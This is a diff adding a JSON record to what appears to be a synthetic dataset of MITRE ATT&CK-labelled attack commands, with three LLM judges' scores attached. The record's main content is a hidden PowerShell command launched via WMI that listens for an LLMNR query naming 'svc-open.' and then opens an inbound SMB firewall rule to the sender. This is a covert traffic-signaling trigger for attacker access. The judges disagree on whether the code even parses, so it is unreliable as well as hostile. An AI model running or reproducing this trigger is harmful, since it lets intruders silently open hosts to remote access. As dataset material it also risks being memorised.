@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-SMB-LLMNR'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-SMB-LLMNR'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 445 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-SMB-LLMNR'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(5355); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); if($d.Length -gt 20){ $p=12; $n=''; while($p -lt $d.Length){ $l=$d[$p]; if($l -eq 0){$p++; break}; $p++; $n += [Text.Encoding]::ASCII.GetString($d,$p,$l)+''.''; $p+=$l }; if($n -eq ''svc-open.''){ Set-NetFirewallRule -DisplayName ''Signal-Open-SMB-LLMNR'' -Enabled True -RemoteAddress $ep.Address; break } } } }'",
+  "explanation": "Monitors LLMNR queries on UDP/5355 and parses the DNS-like question name. A query for the sentinel name 'svc-open.' acts as the signal, enabling an inbound SMB (445) firewall rule restricted to the sender.",
+  "rationale_steps": [
+    "Create disabled inbound rule for TCP/445.",
+    "Listen for LLMNR on UDP/5355 and parse QNAME from the wire format.",
+    "If QNAME equals 'svc-open.', enable the rule and scope to the signaling host."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-5411a282-0b6721cd",
+  "source_prompt_hash": "5411a282",
+  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "Inner PowerShell script has improper single-quote escaping (e.g., $n='' should be $n='''' within the outer single-quoted string), causing a parse error despite otherwise balanced quoting/braces.",
+        "semantic_score": 2,
+        "semantic_justification": "Conceptually aligns with T1205 by using an LLMNR query as a signal to enable a firewall rule, but it is operationally implausible without admin rights for firewall changes and likely cannot bind to UDP/5355 due to the DNS Client service already using the port.",
+        "combined_score": 2.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T14:38:39.141521Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with properly nested quotes using doubled single-quotes for escaping within the outer PowerShell string, balanced braces and parentheses, and valid WMI invocation syntax, though the deeply nested quoting layers create edge-case fragility when passed through WMI's CreateProcess.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1205 Traffic Signaling by listening on UDP/5355 (LLMNR), parsing the DNS-like question name from raw UDP datagrams, using a sentinel hostname ('svc-open.') as a covert trigger signal, and conditionally enabling a pre-staged firewall rule restricted to the signaling host's IP — a textbook port-knocking/traffic-signaling pattern for C2 activation.",
+        "combined_score": 4.5,
+        "confidence": 0.82,
+        "timestamp": "2026-02-19T03:48:59.630204Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax, balanced braces, and proper escaping for nested single quotes within the WMI argument list.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements a traffic signaling mechanism by monitoring LLMNR traffic for a specific 'sentinel' string to dynamically modify firewall rules, which is a textbook implementation of T1205.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T03:49:04.044215Z"
+      }
+    ],
+    "llm_average_syntactic": 3.667,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
